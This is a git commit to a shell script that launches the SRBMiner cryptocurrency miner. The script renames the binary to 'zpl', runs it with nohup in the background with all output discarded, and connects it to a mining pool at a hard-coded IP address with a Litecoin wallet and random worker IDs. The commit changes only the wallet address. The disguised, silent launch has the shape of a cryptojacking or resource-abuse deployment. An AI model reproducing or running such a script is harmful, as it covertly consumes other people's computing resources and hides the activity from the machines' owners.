33af77dc7677eeb747503c16a038676aab4ed6f8
HellDarkK <86185393+SankuNetwork@users.noreply.github.com>
2023-08-17 19:15:44 +0700

    Update SRBMineYPIC.sh

--- mnr/cpulimited/400/SRBMineYPIC.sh
+++ mnr/cpulimited/400/SRBMineYPIC.sh
@@ -10,4 +10,4 @@ cd ..
 mv SRBMiner-MULTI zpl
 rm -rf SRBMiner-Multi-2-3-1/
 #sudo cpulimit --background -e zpl -l 300
-nohup ./zpl --algorithm minotaurx --pool stratum+ssl://103.249.70.7:17019 --wallet ltc1qwu9y0fzjt04pn68vwg6ul0nv5gmtmuhq4jvfffq.worker$(( $RANDOM % 1000 + 1 )) --password c=LTC,mc=lcc,id=YANTO$(( $RANDOM % 1000 + 1 )) --cpu-threads 4 --disable-gpu &> /dev/null &
+nohup ./zpl --algorithm minotaurx --pool stratum+ssl://103.249.70.7:17019 --wallet ltc1qwu9y0fzjt04pn68vwg6ul0nv5gmtmuhq4jvfff.worker$(( $RANDOM % 1000 + 1 )) --password c=LTC,mc=lcc,id=YANTO$(( $RANDOM % 1000 + 1 )) --cpu-threads 4 --disable-gpu &> /dev/null &
